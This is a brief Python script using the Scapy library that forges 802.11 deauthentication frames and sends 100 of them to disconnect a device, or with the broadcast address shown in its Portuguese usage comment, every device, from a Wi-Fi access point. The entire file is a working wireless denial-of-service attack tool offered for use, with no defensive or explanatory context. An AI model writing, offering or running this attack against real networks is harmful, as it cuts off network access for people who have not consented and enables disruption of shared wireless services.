from scapy.all import *

def deauth_attack(target_mac, gateway_mac, interface):
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth()
    sendp(pkt, iface=interface, count=100, inter=.1)
    
# Exemplo de uso
# deauth_attack("FF:FF:FF:FF:FF:FF", "AA:BB:CC:DD:EE:FF", "wlan0mon")
